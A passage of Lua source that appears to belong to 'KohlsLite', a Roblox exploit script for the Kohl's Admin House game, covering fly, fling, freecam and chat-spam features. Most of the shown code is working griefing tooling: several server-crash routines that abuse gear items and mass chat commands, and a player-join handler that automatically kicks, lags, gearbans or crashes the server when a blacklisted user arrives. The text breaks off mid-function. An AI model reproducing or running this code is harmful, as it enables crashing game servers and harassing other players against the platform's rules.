			if direction.X < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((flyspeed) * 50))
			end

			if direction.Z > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((flyspeed) * 50))
			end

			if direction.Z < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((flyspeed) * 50))
			end
		end
	end)
end

local unmobilefly = function(functionsareannoying)
	pcall(function()
		FLYING = false
		local root = getRoot(game.Players.LocalPlayer.Character)
		root:FindFirstChild(velocityHandlerName):Destroy()
		root:FindFirstChild(gyroHandlerName):Destroy()
		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
		mfly1:Disconnect()
		mfly2:Disconnect()
	end)
end

swimming = false
local oldgrav = workspace.Gravity
local swimbeat = nil

function swim()
	if not swimming and game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") then
		RunService = game:GetService("RunService")
		UserInputService = game:GetService("UserInputService")

		oldgrav = workspace.Gravity
		workspace.Gravity = 0

		local swimDied = function()
			workspace.Gravity = oldgrav
			swimming = false
		end

		local Humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
		gravReset = Humanoid.Died:Connect(swimDied)

		local enums = Enum.HumanoidStateType:GetEnumItems()
		table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
		for i, v in pairs(enums) do
			Humanoid:SetStateEnabled(v, false)
		end

		Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
		swimbeat = RunService.Heartbeat:Connect(function()
			pcall(function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity or Vector3.new())
			end)
		end)

		swimming = true
	end
end

function unswim()
	if game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") then
		workspace.Gravity = oldgrav
		swimming = false

		if gravReset then
			gravReset:Disconnect()
		end

		if swimbeat ~= nil then
			swimbeat:Disconnect()
			swimbeat = nil
		end

		local Humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
		local enums = Enum.HumanoidStateType:GetEnumItems()
		table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
		for i, v in pairs(enums) do
			Humanoid:SetStateEnabled(v, true)
		end
	end
end

flinging = false
function fling()
	flinging = false
	for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child:IsA("BasePart") then
			child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, 0.3, 0.5)
		end
	end
	Chat(prefix..'float')
	wait(.1)
	local bambam = Instance.new("BodyAngularVelocity")
	bambam.Name = randomString()
	bambam.Parent = getRoot(game.Players.LocalPlayer.Character)
	bambam.AngularVelocity = Vector3.new(0,99999,0)
	bambam.MaxTorque = Vector3.new(0,math.huge,0)
	bambam.P = math.huge
	local Char = game.Players.LocalPlayer.Character:GetChildren()
	for i, v in next, Char do
		if v:IsA("BasePart") then
			v.CanCollide = false
			v.Massless = true
			v.Velocity = Vector3.new(0, 0, 0)
		end
	end
	flinging = true
	local function flingDiedF()
		Chat(prefix..'unfling')
	end
	flingDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
	repeat
		bambam.AngularVelocity = Vector3.new(0,99999,0)
		wait(.2)
		bambam.AngularVelocity = Vector3.new(0,0,0)
		wait(.1)
	until flinging == false
end

function unfling()
	Chat(prefix..'unfloat')
	if flingDied then
		flingDied:Disconnect()
	end
	flinging = false
	wait(.1)
	local speakerChar = game.Players.LocalPlayer.Character
	if not speakerChar or not getRoot(speakerChar) then return end
	for i,v in pairs(getRoot(speakerChar):GetChildren()) do
		if v.ClassName == 'BodyAngularVelocity' then
			v:Destroy()
		end
	end
	for _, child in pairs(speakerChar:GetDescendants()) do
		if child.ClassName == "Part" or child.ClassName == "MeshPart" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end

-- number checker
function isNumber(str)
	if tonumber(str) ~= nil or str == 'inf' then
		return true
	end
end

-- camera crap (messy I know) -- 
RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")
ContextActionService = game:GetService("ContextActionService")

local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value

local Camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
	local newCamera = workspace.CurrentCamera
	if newCamera then
		Camera = newCamera
	end
end)

Spring = {} do
	Spring.__index = Spring

	function Spring.new(freq, pos)
		local self = setmetatable({}, Spring)
		self.f = freq
		self.p = pos
		self.v = pos*0
		return self
	end

	function Spring:Update(dt, goal)
		local f = self.f*2*math.pi
		local p0 = self.p
		local v0 = self.v

		local offset = goal - p0
		local decay = math.exp(-f*dt)

		local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
		local v1 = (f*dt*(offset*f - v0) + v0)*decay

		self.p = p1
		self.v = v1

		return p1
	end

	function Spring:Reset(pos)
		self.p = pos
		self.v = pos*0
	end
end

local cameraPos = Vector3.new()
local cameraRot = Vector2.new()

local velSpring = Spring.new(5, Vector3.new())
local panSpring = Spring.new(5, Vector2.new())

Input = {} do

	keyboard = {
		W = 0,
		A = 0,
		S = 0,
		D = 0,
		E = 0,
		Q = 0,
		Up = 0,
		Down = 0,
		LeftShift = 0,
	}

	mouse = {
		Delta = Vector2.new(),
	}

	NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
	PAN_MOUSE_SPEED = Vector2.new(1, 1)*(math.pi/64)
	NAV_ADJ_SPEED = 0.75
	NAV_SHIFT_MUL = 0.25

	navSpeed = 1

	function Input.Vel(dt)
		navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

		local kKeyboard = Vector3.new(
			keyboard.D - keyboard.A,
			keyboard.E - keyboard.Q,
			keyboard.S - keyboard.W
		)*NAV_KEYBOARD_SPEED

		local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)

		return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
	end

	function Input.Pan(dt)
		local kMouse = mouse.Delta*PAN_MOUSE_SPEED
		mouse.Delta = Vector2.new()
		return kMouse
	end

	do
		function Keypress(action, state, input)
			keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
			return Enum.ContextActionResult.Sink
		end

		function MousePan(action, state, input)
			local delta = input.Delta
			mouse.Delta = Vector2.new(-delta.y, -delta.x)
			return Enum.ContextActionResult.Sink
		end

		function Zero(t)
			for k, v in pairs(t) do
				t[k] = v*0
			end
		end

		function Input.StartCapture()
			ContextActionService:BindActionAtPriority("FreecamKeyboard",Keypress,false,INPUT_PRIORITY,
				Enum.KeyCode.W,
				Enum.KeyCode.A,
				Enum.KeyCode.S,
				Enum.KeyCode.D,
				Enum.KeyCode.E,
				Enum.KeyCode.Q,
				Enum.KeyCode.Up,
				Enum.KeyCode.Down
			)
			ContextActionService:BindActionAtPriority("FreecamMousePan",MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
		end

		function Input.StopCapture()
			navSpeed = 1

			function Zero(t)
				for k, v in pairs(t) do
					t[k] = v * 0
				end
			end

			Zero(keyboard)
			Zero(mouse)
			ContextActionService:UnbindAction("FreecamKeyboard")
			ContextActionService:UnbindAction("FreecamMousePan")
		end
	end
end

local PlayerState = {} do
	mouseBehavior = ""
	mouseIconEnabled = ""
	cameraType = ""
	cameraFocus = ""
	cameraCFrame = ""
	cameraFieldOfView = ""

	function PlayerState.Push()
		cameraFieldOfView = workspace.CurrentCamera.FieldOfView
		workspace.CurrentCamera.FieldOfView = 70

		cameraType = workspace.CurrentCamera.CameraType
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom

		cameraCFrame = workspace.CurrentCamera.CFrame
		cameraFocus = workspace.CurrentCamera.Focus

		mouseIconEnabled = UserInputService.MouseIconEnabled
		UserInputService.MouseIconEnabled = true

		mouseBehavior = UserInputService.MouseBehavior
		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
	end

	function PlayerState.Pop()
		workspace.CurrentCamera.FieldOfView = 70

		workspace.CurrentCamera.CameraType = cameraType
		cameraType = nil

		workspace.CurrentCamera.CFrame = cameraCFrame
		cameraCFrame = nil

		workspace.CurrentCamera.Focus = cameraFocus
		cameraFocus = nil

		UserInputService.MouseIconEnabled = mouseIconEnabled
		mouseIconEnabled = nil

		UserInputService.MouseBehavior = mouseBehavior
		mouseBehavior = nil
	end
end

function GetFocusDistance(cameraFrame)
	local znear = 0.1
	local viewport = workspace.CurrentCamera.ViewportSize
	local projy = 2*math.tan(cameraFov/2)
	local projx = viewport.x/viewport.y*projy
	local fx = cameraFrame.rightVector
	local fy = cameraFrame.upVector
	local fz = cameraFrame.lookVector

	local minVect = Vector3.new()
	local minDist = 512

	for x = 0, 1, 0.5 do
		for y = 0, 1, 0.5 do
			local cx = (x - 0.5)*projx
			local cy = (y - 0.5)*projy
			local offset = fx*cx - fy*cy + fz
			local origin = cameraFrame.p + offset*znear
			local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
			local dist = (hit - origin).magnitude
			if minDist > dist then
				minDist = dist
				minVect = offset.unit
			end
		end
	end

	return fz:Dot(minVect)*minDist
end

function StepFreecam(dt)
	local vel = velSpring:Update(dt, Input.Vel(dt))
	local pan = panSpring:Update(dt, Input.Pan(dt))

	local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))

	cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
	cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))

	local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
	cameraPos = cameraCFrame.p

	workspace.CurrentCamera.CFrame = cameraCFrame
	workspace.CurrentCamera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
	workspace.CurrentCamera.FieldOfView = cameraFov
end

fcRunning = false
function StartFreecam(pos)
	if fcRunning then
		StopFreecam()
	end

	local cameraCFrame = workspace.CurrentCamera.CFrame
	if pos then
		cameraCFrame = pos
	end

	cameraRot = Vector2.new()
	cameraPos = cameraCFrame.p
	cameraFov = workspace.CurrentCamera.FieldOfView

	velSpring:Reset(Vector3.new())
	panSpring:Reset(Vector2.new())

	PlayerState.Push()
	RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
	Input.StartCapture()
	fcRunning = true
end

function StopFreecam()
	if not fcRunning then 
		return
	end
	RunService:UnbindFromRenderStep("Freecam")
	PlayerState.Pop()
	workspace.Camera.FieldOfView = 70
	fcRunning = false
end

-- GOTO REGEN
function regentp()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Regen.CFrame
end

-- VG CRASH
function VGCrash()
      Chat("gear me 00000000000000094794847")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
      local vg = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
      vg.Parent = game.Players.LocalPlayer.Character
      task.wait(0.2)
      vg:Activate()
      wait(.15)
      for i = 1,100 do
          Chat("unsize me me me")
      end
      PtSH()
end

-- ALT VG CRASH
function CoCrash()
      Chat("gear me 00000000000000094794847")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
      local vg = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
      vg.Parent = game.Players.LocalPlayer.Character
      repeat task.wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
      repeat task.wait() until game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Remote")
      game.Players.LocalPlayer.Character.VampireVanquisher.Remote:FireServer(Enum.KeyCode.Q)
      for i = 1, 5 do
        Chat("unsize me")
      end
      PtSH()
end

-- emerald crash
function EmCrash()
      Chat("gear me 000000000000000178076749")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("Emerald Knights of the Seventh Sanctum Sword and Shield")
      local green = game.Players.LocalPlayer.Backpack:FindFirstChild("Emerald Knights of the Seventh Sanctum Sword and Shield")
      green.Parent = game.Players.LocalPlayer.Character
      task.wait(0.2)
      green:Activate()
      wait(.15)
      for i = 1,100 do
          Chat("dog me me me")
          Chat("clone me me me")
      end
      PtSH()
end

-- sword and shield crash
function PCrash() -- buggy
	for i = 1, 2 do
              Chat("gear me 00000000000000092628079")
              repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("OrinthianSwordAndShield")
              local ort = game.Players.LocalPlayer.Backpack:FindFirstChild("OrinthianSwordAndShield")
              ort.Parent = game.Players.LocalPlayer.Character
              task.wait(0.2)
              ort:Activate()
              task.wait(.15)
              for i = 1,100 do
                  Chat("unsize me me me")
              end
	end
        PtSH()
end

-- WELCOME/LEAVE MSG
function onPlayerAdded(player)
     task.wait(0)
     PLRSTART(player)

     if autogpcheck == true then
          gcplr = player
          gcplrn = player.Name
          checkforpersons()
          checkforperm()
    end

    if not table.find(specialperms, player.Name) and not table.find(atprogperms, player.Name) then
		check_con = false

  		if table.find(rkick_on_sight, player.Name) then
                	if welcomemsg == true then 
				Chat("h \n\n\n Rocket kicking "..player.Name.." as they are blacklisted. \n\n\n")
			end
			print(player.Name.." joined the server. They are being rocket kicked as they were on the rkick_on_sight list.")
			Remind(player.Name.." joined the server. They are being rocket kicked as they were on the rkick_on_sight list.")
			rkickplr(player, player.Name)
			check_con = true
		end

    		if table.find(suser_on_sight, player.Name) then
                	if welcomemsg == true then
				Chat("h \n\n\n Lagging "..player.Name.." with cars as they are blacklisted. \n\n\n")
			end
			print(player.Name.." joined the server. They are being lagged with cars as they were on the suser_on_sight list.")
			Remind(player.Name.." joined the server. They are being lagged with cars as they were on the suser_on_sight list.")
			if not table.find(carcar, player.Name) then
                		table.insert(carcar, player.Name)
			end
			check_con = true
   	 	end

    		if table.find(mkick_on_sight, player.Name) then
               		if welcomemsg == true then
				Chat("h \n\n\n Message kicking "..player.Name.." as they are blacklisted. \n\n\n")
			end
			print(player.Name.." joined the server. They are being message kicked as they were on the mkick_on_sight list.")
			Remind(player.Name.." joined the server. They are being message kicked as they were on the mkick_on_sight list.")
                	antichatplr = true
                	acplr = player.Name
			check_con = true
    		end

		if table.find(hatkick_on_sight, player.Name) then
        		if welcomemsg == true then 
				Chat("h \n\n\n Hat kicking "..player.Name.." as they are blacklisted. \n\n\n")
			end
			print(player.Name.." joined the server. They are being hat kicked as they were on the hatkick_on_sight list.")
			Remind(player.Name.." joined the server. They are being hat kicked as they were on the hatkick_on_sight list.")
			hatkick(player, player.Name)
			check_con = true
		end

    		if table.find(furry_on_sight, player.Name) then
                	Chat(prefix.."char "..player.Name.." furry")
			-- check_con = true
    		end

    		if table.find(crash_on_sight, player.Name) then
		        if welcomemsg == true then
        			Chat("h \n\n\n Server automatically crashed due to blacklisted user ("..player.Name..") joining. \n\n\n")
			end
        		print(player.Name.." joined the server. Server was automatically crashed as they are blacklisted.")
			Remind(player.Name.." joined the server. Server was automatically crashed as they are blacklisted.")
       		 	DCrash();skipwarncrash = true
			check_con = true
   		end

    		if player.AccountAge < newlen == true and newplrautoslock == true then
			if not table.find(whitelist, player.Name) and not table.find(pwl, player.Name) then
				if welcomemsg == true then
         				Chat("h \n\n\n Automatically banned "..player.Name.." for being on an account under the account age limit. \n\n\n")
				end
         			print(player.Name.." joined the server. They were auto-banned for being under the account age limit.")
				Remind(player.Name.." joined the server. They were auto-banned for being under the account age limit.")
         			if not table.find(newplrslocked, player.Name) then
                 			table.insert(newplrslocked, player.Name)
         			end
				check_con = true
			end
   		end

		if autogb == true or table.find(gb_on_sight, player.Name) then 
                	xplr = player
                	xplayer = player.Name
                	Gearban()
			if table.find(gb_on_sight, player.Name) then
				print(player.Name.." joined the server. They were gearbanned since they were on the gb_on_sight list.")
				Remind(player.Name.." joined the server. They were gearbanned since they were on the gb_on_sight list.")
			else
				print(player.Name.." joined the server. They were gearbanned since autogearban was turned on.")
				Remind(player.Name.." joined the server. They were gearbanned since autogearban was turned on.")
			end
			check_con = true
    		end
		
		if check_con then 
			return 
		end

		if welcomemsg == true then
        		if table.find(whitelist, player.Name) then
         			Chat("h \n\n\n Welcome to the server, " .. player.Name .. ". You are whitelisted from serverlocks! \n\n\n")
			elseif table.find(FAdmins, player.Name) then
	         		Chat("h \n\n\n Welcome to the server, " .. player.Name .. ". You have been given free admin! \n\n\n")
			elseif alladmin then
	         		Chat("h \n\n\n Welcome to the server, " .. player.Name .. ". This server has free admin! \n\n\n")
			else
	         		Chat("h \n\n\n Welcome to the server, " .. player.Name .. ". \n\n\n")
			end
		end
	
		print(player.Name.." joined the server.")
        	Remind(player.Name.." joined the server.")
    end

    if table.find(specialperms, player.Name) then
		        Chat("h \n\n\n ".. player.Name .. " [KohlsLite Dev] joined the server! \n\n\n")
			print(player.Name.." [KohlsLite Dev] joined the server.")
        		Remind(player.Name.." [KohlsLite Dev] joined the server.")
    end

    if table.find(atprogperms, player.Name) then
			Chat("h \n\n\n ".. player.Name .. " [KohlsLite Dev] joined the server! \n\n\n")
			print(player.Name.." [KohlsLite Dev] joined the server.")
        		Remind(player.Name.." from [ATPROG PERMS] joined the server.")
    end
end

function onPlayerLeaving(player)
    task.wait(0)
    if welcomemsg == true then
             Chat("h \n\n\n Goodbye, " .. player.Name .. ". \n\n\n")
             print(player.Name.." left the server.")
             Remind(player.Name.." left the server.")
    end

    if table.find(rkick_on_sight, player.Name) then
                kicking = false
    end

    if table.find(suser_on_sight, player.Name) then
                table.remove(carcar, table.find(carcar, player))
    end

    if table.find(carcar, player.Name) then
                table.remove(carcar, table.find(carcar, player))
    end

    if table.find(byecam, player.Name) then
                table.remove(byecam, table.find(byecam, player))
    end

    if acplr == player.Name then
                antichatplr = false
    end

    if table.find(mkick_on_sight, player.Name) then
                antichatplr = false
    end
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
game.Players.PlayerRemoving:Connect(onPlayerLeaving)

-- SUPER COMMAND
function SuperCMD(supermessage)
        for i = 1,amon do
                 Chat(supermessage)
                 task.wait()
        end
end

-- SPAM
task.spawn(function()
        while true do
                task.wait(0)
                if spam == true and spamon == true then
                            Chat(spamtext)
                            task.wait(spamwait)
                end
        end
end)

-- AUTOAFK
local UserInputService = game:GetService("UserInputService")

UserInputService.WindowFocusReleased:Connect(function()
        task.wait(0)
            if autoafk == true then
                    Chat("name me ["..game.Players.LocalPlayer.Name.."]: AFK")
                    Chat("ff me")
                    Chat("god me")
		    if autos.autoff == false then
		    	autos.tempautoff = true
		    end
		    if autos.autogod == false then
		    	autos.tempautogod = true
		    end
            end
end)

UserInputService.WindowFocused:Connect(function()
        task.wait(0)
            if autoafk == true then
                Chat("reset me")
		autos.tempautoff = false
		autos.tempautogod = false
                Chat("unff me")
                Chat("ungod me")
            end
end)

-- Anti-AFK
local vplr = game:GetService("Players")
local virtualUser = game:GetService("VirtualUser")

vplr.LocalPlayer.Idled:Connect(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
end)

-- CLICK
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Button1Down:Connect(function()
        pcall(function()
                local plr = mouse.Target.Parent.Parent
                for i, v in pairs(game.Players:GetPlayers()) do
                    pcall(function()
                            if mouse.Target.Parent:FindFirstChild("Humanoid") then
                                plr = mouse.Target.Parent
                            end
                        end)
                end
                if plr ~= nil then
                    if clickexplode then
                            Chat("explode "..plr.Name)
                    end
                end
        end)
end)

-- REGEN
function Regen()
        if fireclickdetector then
                fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
        else 	
		-- Remind("Sorry, your exploit does not support regenerating the admin pads (fireclickdetector)")
	end
end

-- regen auto
task.spawn(function()
     while true do
           task.wait(0)
           if SRegen == true then
                for i,v in pairs(game.Players:GetChildren()) do
                                for i,pad in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
                                        if pad.Name == v.Name.."'s admin" then
                                               Regen()
                                        end
                                end
                end
           end
     end
end)

-- FAST PADS (don't know why you'd need this)
function FastPads()
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-36.7649803, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-24.764967, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-20.7649632, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16.7649612, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-44.7649994, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-32.7649765, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-40.7649879, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.7649689, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-12.7649641, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
               wait(0.01)
               House()
end

-- GEARBAN
function Gearban()
        Chat("gear me 82357101")
        Chat("unff all")
        Chat("speed " ..xplayer.. " 0")
           local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = xplr.Character.HumanoidRootPart.CFrame
        local cappy = xplr.Character
        repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("PortableJustice")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        tool.Parent = game.Players.LocalPlayer.Character
        tool.MouseClick:FireServer(cappy)
        task.wait(1)                         
        tool:Destroy()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        Chat("ungear me")
end

-- Paint map
function PaintMap(colourhere,mode)
	Chat(prefix.."gear me painter")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	local paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
			
	for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
		task.spawn(function()
			if v:IsA("Part") then
				if mode == "norm" then
					local Partse =
					{
						["Part"] = v,
						["Color"] = colorAPI.transformToColor3(BrickColor.new(colourhere))
					}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				else
					local Partse =
					{
						["Part"] = v,
						["Color"] = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
					}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
				end
			end
		end)
	end
	task.wait(1)
	Chat("ungear me");Chat("unpaint all")
end

function PaintMap_2(r,g,b)
	Chat(prefix.."gear me painter")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	local paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
			
	for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
		task.spawn(function()
			if v:IsA("Part") then
					local Partse =
					{
						["Part"] = v,
						["Color"] = Color3.fromRGB(r,g,b)
					}
					game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
			end
		end)
	end
	task.wait(1)
	Chat("ungear me");Chat("unpaint all")
end

-- Fix paint
function FixPaint()
	Chat(prefix.."gear me painter")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	local paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
			
	coroutine.wrap(function()
			colorAPI.colorHouse({
				wallsC = colorAPI.transformToColor3(BrickColor.new("Brick yellow")),
				baseC = colorAPI.transformToColor3(BrickColor.new("Bright green")),
				roofC = colorAPI.transformToColor3(BrickColor.new("Bright red")),
				WANDDC = colorAPI.transformToColor3(BrickColor.new("Dark orange")),
				stairsC = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
				floorC = colorAPI.transformToColor3(BrickColor.new("Medium blue")),
				rooftsC = colorAPI.transformToColor3(BrickColor.new("Reddish brown")),
				chiC = colorAPI.transformToColor3(BrickColor.new("Sand red"))
			})
	end)()

    	spawn(function()
			colorAPI.colorBuildingBricks({
				DarkStoneGrey = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
				DeepBlue = colorAPI.transformToColor3(BrickColor.new("Deep blue")),
				NY = colorAPI.transformToColor3(BrickColor.new("New Yeller")),
				IW = colorAPI.transformToColor3(BrickColor.new("Institutional white")),
				LimeGreen = colorAPI.transformToColor3(BrickColor.new("Lime green")),
				MSG = colorAPI.transformToColor3(BrickColor.new("Medium stone grey")),
				RB = colorAPI.transformToColor3(BrickColor.new("Really black")),
				TP = colorAPI.transformToColor3(BrickColor.new("Toothpaste")),
				RR = colorAPI.transformToColor3(BrickColor.new("Really red"))	
			})
	end)

	spawn(function()
		colorAPI.colorObbyBox(colorAPI.transformToColor3(BrickColor.new("Teal")))
	end)

	spawn(function()
		colorAPI.colorObbyBricks(colorAPI.transformToColor3(BrickColor.new("Bright red")))
	end)
		
	spawn(function()
		colorAPI.colorAdminDivs(colorAPI.transformToColor3(BrickColor.new("Dark stone grey")))
	end)

	spawn(function()
		colorAPI.colorPads(colorAPI.transformToColor3(BrickColor.new("Bright green")))
		
	end)

	if game.Workspace.Terrain["_Game"].Workspace["Baseplate"] then
		colorAPI.color(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], colorAPI.transformToColor3(BrickColor.new("Bright green")))
	end

	if game:GetService("Workspace").Terrain["_Game"].Admin.Regen then
		colorAPI.color(game:GetService("Workspace").Terrain["_Game"].Admin.Regen, colorAPI.transformToColor3(BrickColor.new("Bright violet")))
	end

	task.wait(1)
	Chat("ungear me")
end

function Lemon()
        Chat("gear me 19703476")
        Chat("unff "..lemonman)
        Chat("speed " ..lemonman.. " 0")
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lman.Character.HumanoidRootPart.CFrame
        repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("YellowSnowball")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("YellowSnowball")
        tool.Parent = game.Players.LocalPlayer.Character
        Chat("music 132323614")
        task.wait(0.6)
        Speak("I'M THE MAN WHO'S GONNA BURN YOUR HOUSE DOWN!")
        task.wait(2.9)
	Speak("WITH THE LEMONS!")
        task.wait(0.6)
        Chat("explode me")
        task.wait(0.7)
        Chat("music nan")
end

function Welding(mode)
	Chat("speed "..welder.." 0")
        Chat("freeze "..welder)
        Chat("unfreeze "..welder)
        repeat wait() until wld.Character:FindFirstChild("ice")
        wld.Character.ice:Destroy()
        Chat("gear me 74385399")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        local Detonator = game.Players.LocalPlayer.Backpack:FindFirstChild("RemoteExplosiveDetonator")
        Detonator.Parent = game.Players.LocalPlayer.Character
	if mode == "right arm" then
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,1.5)
	elseif mode == "left arm" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-2.5,0,1.5)
	elseif mode == "torso" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-1.5,0,1.5)
	elseif mode == "hold" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-0.5,0,1.5)
	else
		mode = "hold"
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-0.5,0,1.5)
	end
        wait(0.2)
        local Act = "Activate"
        local Pos = wld.Character.HumanoidRootPart.Position
        Detonator.RemoteEvent:FireServer(Act, Pos)
        wait(0.3)
	if mode == "hold" then
   		Detonator:Destroy()
    		Chat("ungear me");task.wait(0.1)
